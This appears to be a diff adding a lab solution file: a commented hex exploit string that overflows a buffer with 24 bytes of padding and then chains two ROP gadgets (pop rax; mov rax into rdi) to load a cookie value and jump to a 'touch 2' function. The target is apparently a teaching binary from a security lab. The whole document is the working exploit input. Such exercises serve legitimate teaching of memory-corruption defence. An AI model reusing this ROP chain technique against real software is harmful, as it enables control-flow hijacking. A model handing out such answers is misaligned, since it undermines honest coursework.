@@ -1,0 +1,16 @@
+/* 24 bytes of padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* gadget 1 (pop rax) */
+a3 19 40 00 00 00 00 00
+
+/* value of cookie */
+16 c5 91 4c 00 00 00 00
+
+/* gadget 2 (mov rax into rdi)  */
+8b 19 40 00 00 00 00 00
+
+/* touch 2 address */
+1a 18 40 00 00 00 00 00  
